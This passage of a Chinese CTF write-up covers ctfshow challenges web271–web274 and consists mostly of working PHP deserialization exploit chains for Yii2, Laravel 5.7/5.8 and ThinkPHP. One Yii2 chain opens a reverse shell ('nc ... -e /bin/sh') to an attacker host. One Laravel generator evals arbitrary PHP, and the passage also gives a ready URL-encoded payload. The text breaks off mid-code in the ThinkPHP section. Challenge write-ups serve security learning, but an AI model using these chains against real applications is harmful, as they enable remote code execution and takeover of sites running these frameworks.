&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    $<span class="title class_">exp</span> = <span class="title class_">new</span> \<span class="title class_">yii</span>\<span class="title class_">db</span>\<span class="title class_">BatchQueryResult</span>(&#x27;<span class="title class_">shell_exec</span>&#x27;, &#x27;<span class="title class_">nc</span> <span class="title class_">xxx</span>.<span class="title class_">xxx</span>.<span class="title class_">xxx</span>.<span class="title class_">xxx</span> 4567 -<span class="title class_">e</span> /<span class="title class_">bin</span>/<span class="title class_">sh</span>&#x27;);</span><br><span class="line">    <span class="keyword">echo</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$exp</span>)));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>反弹一下即可，攻击机：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 端口号</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1690628634956-c431daf0-409d-44ba-b40f-75d327b056de.png" alt="image.png"></p><h1 id="web271"><a href="#web271" class="headerlink" title="web271"></a>web271</h1><blockquote><p><a href="https://github.com/laravel/laravel/tree/5.7">https://github.com/laravel/laravel/tree/5.7</a> laravel5.7</p></blockquote><h3 id="laravel5-7反序列化漏洞"><a href="#laravel5-7反序列化漏洞" class="headerlink" title="laravel5.7反序列化漏洞"></a>laravel5.7反序列化漏洞</h3><p>poc：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Foundation</span>\<span class="title class_">Testing</span> &#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">PendingCommand</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">public</span> $<span class="title class_">test</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$app</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$command</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$parameters</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$test</span>, <span class="variable">$app</span>, <span class="variable">$command</span>, <span class="variable">$parameters</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;test = <span class="variable">$test</span>;                 <span class="comment">//一个实例化的类 Illuminate\Auth\GenericUser</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;app = <span class="variable">$app</span>;                   <span class="comment">//一个实例化的类 Illuminate\Foundation\Application</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;command = <span class="variable">$command</span>;           <span class="comment">//要执行的php函数 system</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;parameters = <span class="variable">$parameters</span>;     <span class="comment">//要执行的php函数的参数  array(&#x27;id&#x27;)</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Faker</span> &#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">DefaultGenerator</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">default</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$default</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="keyword">default</span> = <span class="variable">$default</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Foundation</span> &#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Application</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">instances</span> = [];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$instances</span> = []</span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;instances[<span class="string">&#x27;Illuminate\Contracts\Console\Kernel&#x27;</span>] = <span class="variable">$instances</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    $<span class="title class_">defaultgenerator</span> = <span class="title class_">new</span> <span class="title class_">Faker</span>\<span class="title class_">DefaultGenerator</span>(<span class="title class_">array</span>(&quot;<span class="title class_">hello</span>&quot; =&gt; &quot;<span class="title class_">world</span>&quot;));</span><br><span class="line"></span><br><span class="line">    <span class="variable">$app</span> = <span class="keyword">new</span> <span class="title class_">Illuminate\Foundation\Application</span>();</span><br><span class="line"></span><br><span class="line">    <span class="variable">$application</span> = <span class="keyword">new</span> <span class="title class_">Illuminate\Foundation\Application</span>(<span class="variable">$app</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$pendingcommand</span> = <span class="keyword">new</span> <span class="title class_">Illuminate\Foundation\Testing\PendingCommand</span>(<span class="variable">$defaultgenerator</span>, <span class="variable">$application</span>, <span class="string">&#x27;system&#x27;</span>, <span class="keyword">array</span>(<span class="string">&#x27;cat /flag&#x27;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$pendingcommand</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>post data中传入参数即可</p><h1 id="web272、web273"><a href="#web272、web273" class="headerlink" title="web272、web273"></a>web272、web273</h1><p>poc：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Author:monitor</span></span><br><span class="line"><span class="comment">description:</span></span><br><span class="line"><span class="comment">    laravel deserialization chain</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Broadcasting</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">PendingBroadcast</span>&#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">events</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$event</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$events</span>,<span class="variable">$event</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;events = <span class="variable">$events</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;event = <span class="variable">$event</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Bus</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Dispatcher</span>&#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">queueResolver</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$queueResolver</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;queueResolver = <span class="variable">$queueResolver</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Mockery</span>\<span class="title class_">Loader</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">EvalLoader</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">namespace</span> <span class="title class_">Mockery</span>\<span class="title class_">Generator</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">MockDefinition</span>&#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">config</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$code</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$config</span>,<span class="variable">$code</span></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;config = <span class="variable">$config</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;code = <span class="variable">$code</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">MockConfiguration</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Queue</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">CallQueuedClosure</span>&#123;</span><br><span class="line">        <span class="title class_">public</span> $<span class="title class_">connection</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$connection</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;connection = <span class="variable">$connection</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span></span><br><span class="line">&#123;   </span><br><span class="line">    <span class="title class_">if</span>($<span class="title class_">argc</span>&lt;2)&#123;</span><br><span class="line">        <span class="title class_">echo</span> &quot;<span class="title class_">Description</span>:\<span class="title class_">n</span>\<span class="title class_">tUse</span> <span class="title class_">laravel</span> <span class="title class_">deserialization</span> <span class="title class_">to</span> <span class="title class_">eval</span> <span class="title class_">php</span> <span class="title class_">code</span>,<span class="title class_">don</span>&#x27;<span class="title class_">t</span> <span class="title class_">need</span> <span class="title class_">to</span> <span class="title class_">input</span> <span class="title class_">php</span> <span class="title class_">tags</span>.&quot;;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;\nUsage:&quot;</span> .<span class="variable">$argv</span>[<span class="number">0</span>] . <span class="string">&quot; &lt;code&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$code</span> = <span class="variable">$argv</span>[<span class="number">1</span>];</span><br><span class="line">    <span class="variable">$mockconfiguration</span> = <span class="keyword">new</span> <span class="title class_">Mockery\Generator\MockConfiguration</span>(<span class="string">&quot;pass&quot;</span>);</span><br><span class="line">    <span class="variable">$mockdefination</span> = <span class="keyword">new</span> <span class="title class_">Mockery\Generator\MockDefinition</span>(<span class="variable">$mockconfiguration</span>,<span class="string">&quot;&lt;?php &quot;</span>.<span class="variable">$code</span>.<span class="string">&quot; exit;?&gt;&quot;</span>);</span><br><span class="line">    <span class="variable">$callqueuedclosure</span> = <span class="keyword">new</span> <span class="title class_">Illuminate\Queue\CallQueuedClosure</span>(<span class="variable">$mockdefination</span>);</span><br><span class="line">    <span class="variable">$evaload</span> = <span class="keyword">new</span> <span class="title class_">Mockery\Loader\EvalLoader</span>();</span><br><span class="line">    <span class="variable">$dispatcher</span> = <span class="keyword">new</span> <span class="title class_">Illuminate\Bus\Dispatcher</span>(<span class="keyword">array</span>(<span class="variable">$evaload</span>,<span class="string">&quot;load&quot;</span>));</span><br><span class="line">    <span class="variable">$pendingbroadcast</span> = <span class="keyword">new</span> <span class="title class_">Illuminate\Broadcasting\PendingBroadcast</span>(<span class="variable">$dispatcher</span>,<span class="variable">$callqueuedclosure</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$pendingbroadcast</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>或者：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Broadcasting</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Illuminate</span>\<span class="title class_">Bus</span>\<span class="title class_">Dispatcher</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>\<span class="title">Console</span>\<span class="title">QueuedCommand</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">PendingBroadcast</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$events</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$event</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;events=<span class="keyword">new</span> <span class="title class_">Dispatcher</span>();</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;event=<span class="keyword">new</span> <span class="title class_">QueuedCommand</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Foundation</span>\<span class="title class_">Console</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Mockery</span>\<span class="title class_">Generator</span>\<span class="title class_">MockDefinition</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">QueuedCommand</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$connection</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;connection=<span class="keyword">new</span> <span class="title class_">MockDefinition</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Bus</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Mockery</span>\<span class="title class_">Loader</span>\<span class="title class_">EvalLoader</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Dispatcher</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$queueResolver</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;queueResolver=[<span class="keyword">new</span> <span class="title class_">EvalLoader</span>(),<span class="string">&#x27;load&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Mockery</span>\<span class="title class_">Loader</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">EvalLoader</span></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">namespace</span> <span class="title class_">Mockery</span>\<span class="title class_">Generator</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">MockDefinition</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">config</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$code</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;code=<span class="string">&quot;&lt;?php system(&#x27;cat /f*&#x27;);exit()?&gt;&quot;</span>; <span class="comment">//此处是PHP代码</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;config=<span class="keyword">new</span> <span class="title class_">MockConfiguration</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">MockConfiguration</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$name</span>=<span class="string">&quot;feng&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Illuminate</span>\<span class="title class_">Broadcasting</span>\<span class="title class_">PendingBroadcast</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">PendingBroadcast</span>()));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data=O%<span class="number">3</span>A40%<span class="number">3</span>A%<span class="number">22</span>Illuminate%<span class="number">5</span>CBroadcasting%<span class="number">5</span>CPendingBroadcast%<span class="number">22</span>%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A9%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>events%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A25%<span class="number">3</span>A%<span class="number">22</span>Illuminate%<span class="number">5</span>CBus%<span class="number">5</span>CDispatcher%<span class="number">22</span>%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A16%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>queueResolver%<span class="number">22</span>%<span class="number">3</span>Ba%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bi%<span class="number">3</span>A0%<span class="number">3</span>BO%<span class="number">3</span>A25%<span class="number">3</span>A%<span class="number">22</span>Mockery%<span class="number">5</span>CLoader%<span class="number">5</span>CEvalLoader%<span class="number">22</span>%<span class="number">3</span>A0%<span class="number">3</span>A%<span class="number">7</span>B%<span class="number">7</span>Di%<span class="number">3</span>A1%<span class="number">3</span>Bs%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>load%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>D%<span class="number">7</span>Ds%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>event%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A43%<span class="number">3</span>A%<span class="number">22</span>Illuminate%<span class="number">5</span>CFoundation%<span class="number">5</span>CConsole%<span class="number">5</span>CQueuedCommand%<span class="number">22</span>%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A10%<span class="number">3</span>A%<span class="number">22</span>connection%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A32%<span class="number">3</span>A%<span class="number">22</span>Mockery%<span class="number">5</span>CGenerator%<span class="number">5</span>CMockDefinition%<span class="number">22</span>%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A9%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>config%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A35%<span class="number">3</span>A%<span class="number">22</span>Mockery%<span class="number">5</span>CGenerator%<span class="number">5</span>CMockConfiguration%<span class="number">22</span>%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A7%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>name%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>feng%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>Ds%<span class="number">3</span>A7%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>code%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A32%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">3</span>C%<span class="number">3</span>Fphp+system%<span class="number">28</span>%<span class="number">27</span>cat+%<span class="number">2</span>Ff%<span class="number">2</span>A%<span class="number">27</span>%<span class="number">29</span>%<span class="number">3</span>Bexit%<span class="number">28</span>%<span class="number">29</span>%<span class="number">3</span>F%<span class="number">3</span>E%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>D%<span class="number">7</span>D%<span class="number">7</span>D</span><br></pre></td></tr></table></figure><h1 id="web274"><a href="#web274" class="headerlink" title="web274"></a>web274</h1><blockquote><p><a href="https://xz.aliyun.com/t/6619#toc-1">https://xz.aliyun.com/t/6619#toc-1</a></p></blockquote><h3 id="thinkphp"><a href="#thinkphp" class="headerlink" title="thinkphp"></a>thinkphp</h3><p>老顾客</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$append</span> = [];</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$data</span> = [];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;append = [<span class="string">&quot;lin&quot;</span>=&gt;[<span class="string">&quot;calc.exe&quot;</span>,<span class="string">&quot;calc&quot;</span>]];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data = [<span class="string">&quot;lin&quot;</span>=&gt;<span class="keyword">new</span> <span class="title class_">Request</span>()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Request</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$hook</span> = [];</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filter</span> = <span class="string">&quot;system&quot;</span>; <span class="comment">//PHP函数</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$config</span> = 